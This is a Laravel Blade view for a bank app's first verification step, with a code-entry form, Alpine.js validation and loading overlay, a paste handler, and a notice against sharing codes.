@extends('layouts.bankapp')

@section('title', 'Security Verification')
@section('content')

<div class="min-h-[calc(100vh-180px)] flex flex-col items-center justify-center px-4 py-6">
    <!-- Progress Bar -->
    <div class="w-full max-w-md mb-5">
        <div class="bg-white rounded-full h-1.5 overflow-hidden">
            <div class="bg-primary-500 h-full rounded-full" style="width: 33%"></div>
        </div>
        <div class="flex items-center justify-between mt-2 text-xs">
            <span class="text-[#4A4A4A] font-medium">Step 1 of 3</span>
            <span class="text-[#7A7A7A]">33% Complete</span>
        </div>
    </div>

    <!-- Alert Messages -->
    <div class="w-full max-w-md mb-4">
        <x-danger-alert />
        <x-success-alert />
    </div>

    <!-- Loading Overlay -->
    <div x-data="{ loading: false }" @submit.window="loading = true">
        <div x-show="loading" 
             x-transition:enter="transition ease-out duration-200"
             x-transition:enter-start="opacity-0"
             x-transition:enter-end="opacity-100"
             class="fixed inset-0 bg-white/90 z-50 flex items-center justify-center"
             style="display: none;">
            <div class="text-center">
                <div class="w-10 h-10 border-3 border-[#E0E5E5] border-t-primary-500 rounded-full animate-spin mx-auto mb-4"></div>
                <p class="text-sm font-medium text-[#0D1B23]">Verifying Code...</p>
                <p class="text-xs text-[#7A7A7A] mt-1">Processing step 1 of 3</p>
            </div>
        </div>
    </div>

    <!-- Verification Card -->
    <div class="bg-white border border-[#E0E5E5] rounded-xl w-full max-w-md p-6">
        <!-- Header -->
        <div class="flex items-center space-x-3 mb-5">
            <div class="w-10 h-10 rounded-lg bg-primary-600 flex items-center justify-center flex-shrink-0">
                <i data-lucide="shield-check" class="w-5 h-5 text-white"></i>
            </div>
            <div>
                <h1 class="text-lg font-semibold text-[#0D1B23]">Security Verification</h1>
                <p class="text-sm text-[#7A7A7A]">{{ $settings->code1 }} Required</p>
            </div>
        </div>

        <p class="text-sm text-[#7A7A7A] leading-relaxed mb-5">
            {{ $settings->code1message }}
        </p>

        <!-- Verification Form -->
        <form action="{{ route('codecomfirm') }}" method="POST" x-data="{ 
            code: '', 
            submitting: false,
            submitForm(e) {
                if (this.code.length < 3) {
                    e.preventDefault();
                    alert('Please enter a valid code');
                    return;
                }
                this.submitting = true;
            }
        }" @submit="submitForm">
            @csrf
            
            <div class="mb-5">
                <label class="block text-xs uppercase tracking-wider text-[#7A7A7A] font-semibold mb-2">Verification Code</label>
                <input 
                    type="text" 
                    name="code1" 
                    class="w-full text-center text-xl font-mono font-bold tracking-[0.4em] text-[#0D1B23] bg-[#F9F9F9] border border-[#E0E5E5] rounded-lg px-4 py-3.5 placeholder-[#7A7A7A] focus:border-primary-500 focus:ring-1 focus:ring-primary-500/30 focus:outline-none transition-colors uppercase"
                    placeholder="• • • • • •"
                    minlength="3"
                    maxlength="15"
                    autocomplete="off"
                    autocapitalize="characters"
                    spellcheck="false"
                    required
                    x-model="code"
                    @input="code = code.toUpperCase()"
                    autofocus
                >
            </div>

            <button 
                type="submit" 
                class="w-full py-3 rounded-lg bg-primary-600 hover:bg-primary-500 transition-colors text-sm font-medium text-white disabled:opacity-50 disabled:cursor-not-allowed"
                :disabled="submitting || code.length < 3"
                x-text="submitting ? 'Verifying...' : 'Verify & Continue'"
            >
                Verify & Continue
            </button>

            <!-- Security Notice -->
            <div class="mt-4 p-3 bg-[#F9F9F9] border border-[#E0E5E5] rounded-lg flex items-start space-x-2.5">
                <i data-lucide="info" class="w-4 h-4 text-[#7A7A7A] flex-shrink-0 mt-0.5"></i>
                <p class="text-xs text-[#7A7A7A] leading-relaxed">
                    <strong class="text-[#4A4A4A]">Important:</strong> Never share your verification codes with anyone. {{ $settings->site_name }} will never ask for your codes via email or phone.
                </p>
            </div>

            <!-- Help Link -->
            <div class="text-center mt-4">
                <a href="{{ route('support') }}" class="inline-flex items-center space-x-1.5 text-sm text-[#7A7A7A] hover:text-primary-500 transition-colors">
                    <span>Need help?</span>
                    <i data-lucide="arrow-right" class="w-3.5 h-3.5"></i>
                </a>
            </div>
        </form>
    </div>
</div>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        const codeInput = document.querySelector('input[name="code1"]');
        if (codeInput) codeInput.focus();
        if (typeof lucide !== 'undefined') lucide.createIcons();
    });

    document.addEventListener('paste', function(e) {
        const codeInput = document.querySelector('input[name="code1"]');
        if (codeInput && document.activeElement !== codeInput) {
            e.preventDefault();
            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
            codeInput.value = pastedText.toUpperCase();
            codeInput.focus();
        }
    });
</script>

@endsection
